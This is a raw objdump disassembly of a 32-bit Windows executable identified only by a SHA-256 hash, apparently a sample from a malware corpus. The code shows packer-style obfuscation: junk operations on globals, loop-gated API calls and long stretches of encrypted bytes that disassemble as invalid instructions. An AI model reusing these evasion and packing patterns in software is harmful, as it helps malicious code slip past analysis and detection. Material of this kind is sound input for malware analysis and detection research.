
442947481a29747f78bf24e2dc7ced3967dbea712d5f298d23b22c5220a92b79.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43478b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x434663
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x4346d3
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x434673,0x4346c7
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43478b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x4346bb,0x10
  40104d:	cmp    DWORD PTR ds:0x4346bb,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x4346bb,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x4346bb,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x4346bb
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x4346bb,ebx
  401095:	mov    ebx,DWORD PTR ds:0x4346bb
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x4346bb,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43478f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x4346df
  4010b6:	mov    ebx,DWORD PTR ds:0x4347b3
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434687,0x43470b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43470f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43470f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43470f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43470f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43470f,0xe
  401103:	jne    0x401119
  401109:	push   0x43466b
  40110e:	push   0x4349db
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43470f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43470f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43470f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x43466b,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x82f81829
  401151:	(bad)  
  401152:	mov    bh,0x7e
  401154:	jle    0x4011d4
  401156:	jle    0x40110d
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	(bad)  
  401169:	or     al,0xf
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x4693c6b0
  401207:	psllq  mm4,QWORD PTR [edi+0x6a]
  40120b:	rcr    BYTE PTR [eax+0x130478fb],cl
  401211:	jg     0x401242
  401213:	cs push 0xffffffb2
  401216:	pop    edi
  401217:	nop
  401218:	xor    ebx,DWORD PTR [edx-0x66]
  40121b:	arpl   WORD PTR [ecx-0x155591ca],bx
  401221:	(bad)  
  401222:	nop
  401223:	sub    al,0x62
  401225:	or     BYTE PTR [ecx],ch
  401227:	add    al,0x4b
  401229:	mov    eax,ds:0xde93b4c4
  40122e:	mov    edx,0xc662e05c
  401233:	dec    ebx
  401234:	xchg   ecx,eax
  401235:	adc    ebp,DWORD PTR gs:0xe559f9bf
  40123c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40123d:	mov    esi,eax
  40123f:	in     al,dx
  401240:	stc    
  401241:	jbe    0x4011cd
  401243:	add    al,0x41
  401245:	fcom   DWORD PTR [eax]
  401247:	push   0x5552f90b
  40124c:	or     eax,0xf6d40528
  401251:	inc    ebp
  401252:	xor    DWORD PTR [eax],ebp
  401254:	sbb    eax,0x3f4b41d4
  401259:	out    dx,al
  40125a:	mov    dh,0x2d
  40125c:	fld    DWORD PTR [edi+eiz*8+0x4f]
  401260:	cmp    esp,DWORD PTR [ecx]
  401262:	sub    al,0xba
  401264:	sbb    eax,0xa981a735
  401269:	jmp    0x14e7:0x6d75dc91
  401270:	enter  0x4706,0x2c
  401274:	xor    al,0x8e
  401276:	push   ss
  401277:	jb     0x4012d2
  401279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40127a:	hlt    
  40127b:	and    bh,BYTE PTR [ebx-0x58]
  40127e:	jp     0x40127f
  401280:	fcomip st,st(4)
  401282:	das    
  401283:	das    
  401284:	lahf   
  401285:	bndstx [esi+0x47],bnd1
  401289:	mov    ah,0x76
  40128b:	mov    dl,0xf6
  40128d:	lods   al,BYTE PTR ds:[esi]
  40128e:	mov    ecx,?
  401290:	inc    bl
  401292:	(bad)  
  401293:	sbb    BYTE PTR [edx+0x51],bh
  401296:	mov    ds,WORD PTR [esi]
  401298:	ds loop 0x401235
  40129b:	mov    al,ds:0x9aa73a24
  4012a0:	push   edi
  4012a1:	mov    DWORD PTR [eax+0x11a5da6f],edx
  4012a7:	push   0xffffffbe
  4012a9:	addr16 jno 0x401258
  4012ac:	imul   esi,DWORD PTR [ebx+0x73],0x67758503
  4012b3:	push   ebp
  4012b4:	arpl   WORD PTR [ebp+0x78],di
  4012b7:	xchg   esi,eax
  4012b8:	ss push ebx
  4012ba:	hlt    
  4012bb:	(bad)  
  4012bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012bd:	leave  
  4012be:	or     DWORD PTR [ecx],esi
  4012c0:	pop    edx
  4012c1:	push   esp
  4012c2:	push   ebx
  4012c3:	shl    eax,0x8a
  4012c6:	pusha  
  4012c7:	inc    ebx
  4012c8:	mov    ebx,0xb806f8eb
  4012cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ce:	sub    esp,DWORD PTR [edx]
  4012d0:	sbb    DWORD PTR ds:0x2be4b105,edx
  4012d6:	sub    DWORD PTR [edi+0x1bb028c1],esi
  4012dc:	cmp    al,0x60
  4012de:	in     eax,0xe4
  4012e0:	in     eax,dx
  4012e1:	mov    bl,0x19
  4012e3:	ficomp WORD PTR [eax+0x3e]
  4012e6:	push   esi
  4012e7:	rol    BYTE PTR [ecx+0x5d],cl
  4012ea:	mov    edi,0x122da29e
  4012ef:	test   eax,0x764c689
  4012f4:	repz idiv DWORD PTR [ebp+0x7b]
  4012f8:	mov    ecx,ebx
  4012fa:	pusha  
  4012fb:	ja     0x401317
  4012fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012fe:	sbb    bl,al
  401300:	fadd   QWORD PTR [ecx+0x5f]
  401303:	mov    WORD PTR [ebp+0x1d],?
  401306:	ja     0x4012d1
  401308:	fnstsw WORD PTR [edi]
  40130a:	add    al,0xaa
  40130c:	push   DWORD PTR [ebx-0x3337ff87]
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x4346ff,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x4346bf,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x43466f,0x434663
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x434673,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x434743,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x434743
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x434743,ebx
  40137c:	cmp    DWORD PTR ds:0x434743,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x434743,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x434743
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x434743,ebx
  4013ae:	cmp    DWORD PTR ds:0x434743,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x4346bf,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43470b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x43466f,0x4346bf
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x43466b,0x434777
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434683,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [ebp+ebp*4+0x7fb5c53d],esp
  40141d:	jle    0x40149d
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	sbb    al,0xab
  401425:	inc    esi
  401426:	cmp    al,0x51
  401428:	repnz iret 
  40142a:	or     al,0xa
  40142c:	xor    al,0x96
  40142e:	mov    esi,0x562d23e7
  401433:	aas    
  401434:	sbb    DWORD PTR [esi],edi
  401436:	ins    BYTE PTR es:[edi],dx
  401437:	and    DWORD PTR [ebx+0x50],ecx
  40143a:	mov    ebp,0xab635f75
  40143f:	loope  0x40148d
  401441:	stc    
  401442:	out    0xa,eax
  401444:	icebp  
  401445:	fucomp st(1)
  401447:	or     DWORD PTR [ebp-0x5c],eax
  40144a:	scas   al,BYTE PTR es:[edi]
  40144b:	call   0xe971:0x5d043382
  401452:	lods   al,BYTE PTR ds:[esi]
  401453:	and    esp,esp
  401455:	sbb    eax,0xc281cd36
  40145a:	jo     0x40147c
  40145c:	xchg   esp,eax
  40145d:	cmp    esp,0xe6797165
  401463:	dec    esi
  401464:	dec    edx
  401465:	mov    edi,0x6d8c52e3
  40146a:	inc    edx
  40146b:	clc    
  40146c:	pop    ss
  40146d:	mov    esi,?
  40146f:	adc    eax,0xd58a6d23
  401474:	pop    edx
  401475:	add    dl,BYTE PTR [esp+edi*1-0x2c]
  401479:	fdivr  DWORD PTR [esi]
  40147b:	iret   
  40147c:	ss sbb dh,bl
  40147f:	inc    esi
  401480:	popa   
  401481:	mov    edi,DWORD PTR [ecx+0x3]
  401484:	cwde   
  401485:	or     dh,BYTE PTR [ebp+ebx*2-0x4e]
  401489:	out    dx,eax
  40148a:	jae    0x401424
  40148c:	sbb    ecx,DWORD PTR ds:0xfb8472fa
  401492:	xchg   ebp,eax
  401493:	dec    esi
  401494:	xchg   DWORD PTR [eax-0x513a8853],ebx
  40149a:	jl     0x4014b2
  40149c:	or     BYTE PTR [ebp+0x70286ef0],cl
  4014a2:	or     al,0x1f
  4014a4:	push   ds
  4014a5:	xchg   esp,eax
  4014a6:	pop    ebx
  4014a7:	mov    edx,0xaa2ab8e9
  4014ac:	push   es
  4014ad:	lods   al,BYTE PTR ds:[esi]
  4014ae:	call   0xb2cfcd3e
  4014b3:	mov    esp,0x2534a8c0
  4014b8:	fdiv   st,st(7)
  4014ba:	sub    ebx,DWORD PTR [edx]
  4014bc:	in     al,dx
  4014bd:	ror    BYTE PTR [ecx-0x5499d34],0x23
  4014c4:	xor    eax,0xe5600206
  4014c9:	jne    0x401495
  4014cb:	repnz shl DWORD PTR [edx],0x4c
  4014cf:	adc    DWORD PTR [ebp-0x66],esp
  4014d2:	cs jbe 0x40154a
  4014d5:	xchg   ebx,eax
  4014d6:	ror    DWORD PTR [edi-0x79dff804],cl
  4014dc:	shr    DWORD PTR [ecx-0x470b2ad9],0xb6
  4014e3:	mov    dl,BYTE PTR [ecx-0x14]
  4014e6:	fucomi st,st(1)
  4014e8:	adc    edi,0xffffffe3
  4014eb:	add    DWORD PTR [edx],esp
  4014ed:	test   eax,0x5aa3d206
  4014f2:	mov    ds:0xd6b9260d,eax
  4014f7:	lods   al,BYTE PTR ds:[esi]
  4014f8:	jle    0x4014ea
  4014fa:	out    0xbf,al
  4014fc:	inc    edi
  4014fd:	add    ebx,DWORD PTR [ebx-0x4a]
  401500:	mov    dl,0x7d
  401502:	gs jbe 0x401568
  401505:	dec    edi
  401506:	sub    eax,0xf58128d0
  40150b:	or     BYTE PTR [ebx],ah
  40150d:	lea    ebp,[ebx+0x6493dfbe]
  401513:	and    ah,cl
  401515:	mov    eax,0x7bb6ef99
  40151a:	hlt    
  40151b:	and    bh,BYTE PTR [ebx+edi*1]
  40151e:	stos   DWORD PTR es:[edi],eax
  40151f:	fmul   st,st(3)
  401521:	sbb    al,0xac
  401523:	not    BYTE PTR [ecx+0x23313019]
  401529:	repz pop es
  40152b:	add    BYTE PTR [ecx],0xe5
  40152e:	test   DWORD PTR [ebx-0x32b09c],ebp
  401534:	or     dh,ah
  401536:	or     al,0x36
  401538:	(bad)  [edi+0x30]
  40153b:	add    al,0x75
  40153d:	shl    DWORD PTR [ecx-0x285366ab],1
  401543:	loope  0x4014c9
  401545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401546:	cs dec edx
  401548:	fimul  WORD PTR ds:0x67549bff
  40154e:	iret   
  40154f:	in     eax,dx
  401550:	in     al,0x4c
  401552:	mov    eax,ds:0xb33c5631
  401557:	pop    ss
  401558:	or     BYTE PTR [edi-0x6323955c],dh
  40155e:	add    al,0x43
  401560:	shl    DWORD PTR [edx],cl
  401562:	cmp    DWORD PTR [ebx-0x1],ecx
  401565:	jae    0x4015c1
  401567:	push   edi
  401568:	push   es
  401569:	retf   
  40156a:	sub    ebp,DWORD PTR [edi+0x58]
  40156d:	(bad)  
  40156e:	leave  
  40156f:	push   0x13
  401571:	adc    DWORD PTR [eax],ebp
  401573:	sub    al,0xeb
  401575:	call   0x2a14cdf2
  40157a:	(bad)  
  40157b:	cmp    al,0xff
  40157d:	cmp    al,0xff
  40157f:	mov    eax,0x5b66385e
  401584:	adc    al,0xef
  401586:	sub    bh,dl
  401588:	and    eax,DWORD PTR [ebx-0xa]
  40158b:	ins    DWORD PTR es:[edi],dx
  40158c:	test   al,0x73
  40158e:	xlat   BYTE PTR ds:[ebx]
  40158f:	jl     0x40156e
  401591:	add    ecx,DWORD PTR [esi]
  401593:	shr    DWORD PTR ds:0xabbd7a7c,0xe5
  40159a:	and    BYTE PTR [ecx],0xf9
  40159d:	popa   
  40159e:	jle    0x401616
  4015a0:	clc    
  4015a1:	out    dx,al
  4015a2:	or     DWORD PTR [edx-0x36b7febd],ebx
  4015a8:	mov    esp,0xd54cd499
  4015ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015ae:	outs   dx,DWORD PTR ds:[esi]
  4015af:	add    BYTE PTR [ebx+esi*4-0x6be00817],cl
  4015b6:	sbb    cl,dh
  4015b8:	sar    BYTE PTR [ecx],cl
  4015ba:	mov    bl,0xc9
  4015bc:	sub    esi,0x7d2b4299
  4015c2:	sub    al,0xee
  4015c4:	xor    ebx,DWORD PTR [ebp+0x4f5111d2]
  4015ca:	jb     0x40156f
  4015cc:	xchg   esi,eax
  4015cd:	and    cl,BYTE PTR [ebx+edi*1+0x66]
  4015d1:	int3   
  4015d2:	mov    bh,0x49
  4015d4:	mov    bl,0xa
  4015d6:	repz std 
  4015d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d9:	inc    eax
  4015da:	mov    eax,DWORD PTR [ebp+0x8]
  4015dd:	mov    ecx,DWORD PTR ds:0x43478f
  4015e3:	and    DWORD PTR ds:0x43473f,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x434663,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x4346c3,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434713,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434703,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434703
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434703,ecx
  40162d:	cmp    DWORD PTR ds:0x434703,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434703,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434703
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434703,ecx
  40165f:	cmp    DWORD PTR ds:0x434703,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x4346a3
  401674:	mov    eax,ds:0x4346eb
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x43474b,0x434777
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x43466b,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x43466f,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	jb     0x4016f4
  4016bb:	mov    al,ds:0x7e79ecf6
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x4016a1
  4016c6:	ja     0x4016fd
  4016c8:	scas   eax,DWORD PTR es:[edi]
  4016c9:	pop    esp
  4016ca:	fdiv   DWORD PTR [esi-0x6878df6c]
  4016d0:	fnstsw WORD PTR [edx]
  4016d2:	je     0x4016a1
  4016d4:	dec    eax
  4016d5:	cdq    
  4016d6:	or     al,0xc1
  4016d8:	mov    al,0x79
  4016da:	push   eax
  4016db:	out    dx,al
  4016dc:	push   0x67
  4016de:	mul    BYTE PTR [ebx-0x64de17fa]
  4016e4:	push   ds
  4016e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e6:	push   edi
  4016e7:	jno    0x4016e2
  4016e9:	push   esi
  4016ea:	mov    fs,WORD PTR [edi]
  4016ec:	leave  
  4016ed:	xchg   esp,eax
  4016ee:	xchg   DWORD PTR [esi],eax
  4016f0:	in     al,0x85
  4016f2:	out    0x48,eax
  4016f4:	loope  0x4016ca
  4016f6:	cmp    eax,0xb34acefd
  4016fb:	nop
  4016fc:	rcr    BYTE PTR [ecx+0x76fab35b],1
  401702:	add    DWORD PTR [ebp+ecx*1-0x7c],ebp
  401706:	mov    ebp,0x1471e0c7
  40170b:	dec    ebx
  40170c:	pop    edx
  40170d:	jl     0x401693
  40170f:	(bad)  
  401710:	push   edx
  401711:	xor    al,0x67
  401713:	fstp   QWORD PTR [edi+0x24]
  401716:	xchg   edi,eax
  401717:	add    al,0xfa
  401719:	and    esp,DWORD PTR [ecx-0x5]
  40171c:	and    ch,bl
  40171e:	pop    ebx
  40171f:	mov    DWORD PTR [ebx],ebp
  401721:	cld    
  401722:	mov    edi,0x944d88ba
  401727:	inc    ebp
  401728:	adc    DWORD PTR [ecx+ebp*8-0x27],ecx
  40172c:	adc    eax,0xe03520b7
  401731:	sti    
  401732:	pushf  
  401733:	add    edi,DWORD PTR [esi]
  401735:	mov    al,ds:0x482392dc
  40173a:	loop   0x4017a7
  40173c:	adc    BYTE PTR [ecx-0x2c],bl
  40173f:	imul   ebx,DWORD PTR [eax+0x58f4720f],0xe189cb48
  401749:	or     DWORD PTR [eax+0x3af9f240],esi
  40174f:	cmp    al,0x2
  401751:	or     DWORD PTR [ebx],0xffffffe3
  401754:	out    0xcd,eax
  401756:	sub    al,0x9e
  401758:	or     cl,BYTE PTR [edi]
  40175a:	xchg   DWORD PTR [edi],eax
  40175c:	(bad)  cs:[eax]
  40175f:	lods   eax,DWORD PTR ds:[esi]
  401760:	dec    edx
  401761:	sbb    BYTE PTR [edx+0x2e8311b4],cl
  401767:	shl    BYTE PTR ds:0x1631e852,0x6e
  40176e:	push   edi
  40176f:	test   DWORD PTR [eax],0x93d278f3
  401775:	inc    edx
  401776:	outs   dx,BYTE PTR ds:[esi]
  401777:	ins    DWORD PTR es:[edi],dx
  401778:	(bad)  
  40177b:	mov    bl,0x9b
  40177d:	clc    
  40177e:	cdq    
  40177f:	nop
  401780:	pop    ds
  401781:	loop   0x4017ab
  401783:	scas   al,BYTE PTR es:[edi]
  401784:	cdq    
  401785:	rcl    BYTE PTR [esi-0x2b],cl
  401788:	push   edi
  401789:	enter  0x1591,0x47
  40178d:	sub    al,ah
  40178f:	sbb    BYTE PTR [ebp-0x41c5d29b],0xb1
  401796:	mov    bh,bl
  401798:	(bad)  
  401799:	mov    ds:0x744afea8,eax
  40179e:	cs and eax,0x3eaf0350
  4017a4:	cmp    DWORD PTR [edi+0x1ad7819e],eax
  4017aa:	cmp    BYTE PTR [ebx-0x78e0552c],dl
  4017b0:	rcl    ebx,0x47
  4017b3:	add    DWORD PTR [eax-0x3f6a519f],ebx
  4017b9:	fnstenv [ecx+0x11]
  4017bc:	xchg   edi,eax
  4017bd:	xchg   ebx,eax
  4017be:	sahf   
  4017bf:	pop    ss
  4017c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c1:	lds    ebx,FWORD PTR ds:0xcc2ceb35
  4017c7:	adc    ch,0xd5
  4017ca:	(bad)  
  4017cb:	lods   eax,DWORD PTR ds:[esi]
  4017cc:	push   0xffffff83
  4017ce:	fldenv [ecx+0x5c7b3756]
  4017d4:	stos   BYTE PTR es:[edi],al
  4017d5:	xchg   ebx,eax
  4017d6:	xchg   edx,ecx
  4017d8:	arpl   WORD PTR [esi],bx
  4017da:	mov    dl,0x10
  4017dc:	jno    0x40176c
  4017de:	mov    dh,0xff
  4017e0:	sub    edx,esi
  4017e2:	sub    ecx,DWORD PTR [ecx]
  4017e4:	pop    edi
  4017e5:	sbb    al,0xbc
  4017e7:	and    eax,0x3b73a9f4
  4017ec:	fisttp QWORD PTR [ebp-0x48]
  4017ef:	out    0xa4,eax
  4017f1:	das    
  4017f2:	das    
  4017f3:	inc    ecx
  4017f4:	push   es
  4017f5:	fcom   QWORD PTR [esi-0x4edb0128]
  4017fb:	(bad)  
  4017fc:	lock or BYTE PTR [esi+ebp*2+0xc],al
  401801:	mov    ecx,0x576621fd
  401806:	or     al,0x4c
  401808:	push   ebp
  401809:	sti    
  40180a:	dec    esp
  40180b:	cmp    ax,0xad7d
  40180f:	mov    esp,0x12e3d16d
  401814:	sbb    eax,0xea0e2abd
  401819:	sub    eax,0xa41cc987
  40181e:	jecxz  0x4017fa
  401820:	mov    esp,0xf6851619
  401825:	pushf  
  401826:	push   ds
  401827:	dec    esi
  401828:	sbb    eax,0x5a0b7d22
  40182d:	test   BYTE PTR [edx-0xf],ah
  401830:	sbb    ebp,DWORD PTR [eax-0x22484594]
  401836:	cmp    BYTE PTR [ebx],0x55
  401839:	addr16 jnp 0x4017cd
  40183c:	jbe    0x40181e
  40183e:	and    eax,DWORD PTR [esi-0x767f9b14]
  401844:	fs push esi
  401846:	jae    0x4017f8
  401848:	mov    ebx,DWORD PTR ds:0x4c14dcae
  40184e:	mov    ch,0x27
  401850:	pop    esp
  401851:	add    esp,ecx
  401853:	ror    DWORD PTR [edi],cl
  401855:	lods   al,BYTE PTR ds:[esi]
  401856:	jle    0x401824
  401858:	enter  0xeb07,0xb1
  40185c:	sbb    ebp,DWORD PTR [edx+0x74]
  40185f:	sti    
  401860:	mov    bh,cl
  401862:	daa    
  401863:	(bad)  
  401866:	clc    
  401867:	mov    ah,0x1e
  401869:	mov    cl,0x37
  40186b:	mov    edx,0x5a5e9f79
  401870:	in     al,dx
  401871:	fsubr  DWORD PTR [ebx+0x5f19aaf8]
  401877:	xchg   edi,eax
  401878:	fisttp QWORD PTR [esi-0x7af0ea8a]
  40187e:	daa    
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4347830d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x434663
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    dh,dh
  4018a0:	into   
  4018a1:	dec    esi
  4018a2:	jbe    0x4018bf
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x40188b
  4018ac:	shl    BYTE PTR [eax],1
  4018ae:	xchg   edi,eax
  4018af:	in     eax,0xb4
  4018b1:	data16 mov ds:0xfcb9b9d6,al
  4018b7:	jb     0x40189a
  4018b9:	or     esp,ecx
  4018bb:	jmp    0x8178:0x8811c24f
  4018c2:	jo     0x401914
  4018c4:	aaa    
  4018c5:	dec    eax
  4018c6:	and    DWORD PTR [esi],esi
  4018c8:	out    0x75,al
  4018ca:	xor    eax,0xe85d04b9
  4018cf:	xchg   edx,eax
  4018d0:	shr    BYTE PTR [ebx],cl
  4018d2:	pop    ecx
  4018d3:	popa   
  4018d4:	les    eax,FWORD PTR [edx+0x39]
  4018d7:	sub    eax,0xf02bcda8
  4018dc:	push   ebp
  4018dd:	int    0x6a
  4018df:	into   
  4018e0:	push   0x5ea92420
  4018e5:	mov    ebx,0x5d6d96b9
  4018ea:	ret    0xe51f
  4018ed:	pop    edi
  4018ee:	xor    eax,0x972ca592
  4018f3:	pop    es
  4018f4:	stc    
  4018f5:	xchg   DWORD PTR [edx-0x4f],ebp
  4018f8:	add    DWORD PTR [edx+0x71450e20],0x4d
  4018ff:	mov    dl,0xd8
  401901:	xlat   BYTE PTR ds:[ebx]
  401902:	cdq    
  401903:	stc    
  401904:	and    BYTE PTR [ebp-0x3e703428],cl
  40190a:	xor    DWORD PTR [edx],edx
  40190c:	loope  0x4018b1
